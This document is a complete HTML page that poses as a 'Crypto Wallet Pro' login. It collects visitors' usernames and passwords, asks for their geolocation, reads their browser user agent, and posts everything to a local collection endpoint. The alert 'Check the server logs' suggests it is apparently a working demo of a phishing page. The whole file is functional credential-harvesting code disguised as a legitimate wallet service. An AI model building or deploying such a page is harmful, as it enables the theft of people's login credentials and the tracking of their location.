<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Crypto Wallet Pro - Secure Your Assets</title>
    <style>
        /* CSS for styling the page to make it look trendy and modern */
        body {
            font-family: 'Arial', sans-serif;
            background-color: #121212;
            color: #ffffff;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        
        .container {
            background-color: #1f1f1f;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
            width: 400px;
            text-align: center;
        }
        
        h1 {
            color: #00ff9d;
            margin-bottom: 20px;
        }
        
        p {
            font-size: 16px;
            margin-bottom: 20px;
        }
        
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: none;
            border-radius: 5px;
            background-color: #333333;
            color: #ffffff;
        }
        
        button {
            background-color: #00ff9d;
            color: #121212;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
        }
        
        button:hover {
            background-color: #00cc7a;
        }
        
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #888888;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Crypto Wallet Pro</h1>
        <p>Secure your cryptocurrencies with our app. Enter your details to get started and sync your wallet.</p>
        <form id="userForm">
            <input type="text" id="username" placeholder="Enter your username" required>
            <input type="password" id="password" placeholder="Enter your password" required>
            <button type="submit">Login and Sync</button>
        </form>
        <div class="footer">
            <p>By using this, you agree to share your info for security.</p>
        </div>
    </div>

    <script>
        document.getElementById('userForm').addEventListener('submit', function(event) {
            event.preventDefault();
            
            // Extract user inputs
            var username = document.getElementById('username').value;
            var password = document.getElementById('password').value;
            
            // Extract geolocation if available
            var geolocation = {};
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    geolocation = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude
                    };
                    sendData(username, password, geolocation);  // Send data after getting location
                }, function(error) {
                    console.log('Geolocation error: ' + error.message);
                    sendData(username, password, {});  // Send without geolocation if error
                });
            } else {
                sendData(username, password, {});
            }
            
            // Function to send data to the server
            function sendData(username, password, geolocation) {
                var userAgent = navigator.userAgent;  // Extract device info
                
                var data = {
                    username: username,
                    password: password,
                    geolocation: geolocation,
                    userAgent: userAgent
                };
                
                // Send data via Fetch to the server
                fetch('http://localhost:3000/saveData', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                })
                .then(response => response.text())
                .then(result => {
                    alert('Data sent successfully! Check the server logs.');
                })
                .catch(error => {
                    console.error('Error sending data:', error);
                    alert('Failed to send data.');
                });
            }
        });
    </script>
</body>
</html>
